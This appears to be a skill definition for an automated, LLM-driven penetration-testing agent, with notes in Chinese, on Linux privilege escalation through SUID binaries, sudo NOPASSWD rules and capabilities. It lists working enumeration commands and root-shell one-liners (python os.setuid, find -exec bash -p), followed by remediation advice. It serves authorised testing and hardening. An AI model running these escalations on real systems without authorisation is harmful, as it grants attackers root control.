---
name: linux-suid-sudo-privesc
description: Enumerates and exploits SUID binaries, sudo misconfigurations, and Linux capabilities for local privilege escalation to root. Reference: GTFOBins.
skill_type: exploit
severity: critical
tags: [privesc, suid, sudo, capabilities, linux, privilege-escalation, gtfobins]
---

# Linux SUID/sudo/capabilities 本地提权

## Essential Principles
1. **SUID 二进制**：以文件所有者权限执行，若所有者为 root 则可提权
2. **sudo 配置**：/etc/sudoers 中允许当前用户 NOPASSWD 执行某些命令
3. **capabilities**：文件级 capability 可绕过普通权限检查
4. 利用方式参考 GTFOBins (https://gtfobins.github.io/)

## When to Use
- 已获得 Linux 系统普通用户 shell
- 需要提权至 root

## When NOT to Use
- 无交互式 shell 环境
- Windows 目标

## Path Selection
| 优先级 | 条件 | 路径 | 方法 |
|--------|------|------|------|
| 1 | sudo NOPASSWD | sudo_nopasswd_shell | sudo bash 或 sudo 命令滥用 |
| 2 | SUID python | suid_python | os.setuid(0) 执行命令 |
| 3 | SUID find | suid_find | find -exec bash -p |
| 4 | SUID bash | suid_bash | bash -p 保留 EUID |
| 5 | cap_setuid | cap_setuid | Python/Perl cap_setuid 利用 |
| 6 | 可写 cron | writable_cron | cron 文件注入命令 |
| 99 | 兜底 | llm_freeform | LLM 自由推理 |

## Key Commands
```bash
# SUID 枚举
find / -perm -4000 -type f 2>/dev/null

# sudo 权限检查
sudo -l

# capabilities 枚举
getcap -r / 2>/dev/null

# SUID python 提权
python -c 'import os; os.setuid(0); os.system("/bin/bash -p")'

# SUID find 提权
find / -maxdepth 0 -exec /bin/bash -p -c 'id' \;
```

## Remediation
1. 审查所有 SUID 二进制文件，移除不必要的 setuid 位
2. 限制 sudoers 配置，避免 NOPASSWD 对危险命令的授权
3. 使用最小权限原则分配 Linux capabilities
4. 确保 cron 文件权限正确，不可被普通用户写入
